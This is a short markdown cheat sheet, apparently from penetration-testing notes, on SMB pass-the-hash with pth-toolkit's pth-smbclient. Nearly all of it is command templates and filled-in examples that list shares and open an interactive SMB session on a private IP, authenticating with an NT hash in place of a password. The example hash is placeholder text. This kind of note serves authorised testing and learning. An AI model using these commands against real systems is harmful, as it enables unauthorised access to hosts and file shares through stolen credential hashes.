# Pass the hash

## Smb pass the hash

### Tool:

[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)


#### Listing shared folders

sudo pth-smbclient --user=<user> --pw-nt-hash -m smb3  -L <target_ip> \\\\<target_ip>\\ <hash>

`sudo pth-smbclient --user=user --pw-nt-hash -m smb3  -L 192.168.0.24 \\\\192.168.0.24\\ ljahdçjkhadkahdkjahsdlkjahsdlkhadklad`

#### Interactive smb shell

sudo pth-smbclient --user=<user> --pw-nt-hash -m smb3  \\\\<target_ip>\\shared_folder <hash>

`sudo pth-smbclient --user=user --pw-nt-hash -m smb3 \\\\192.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad`
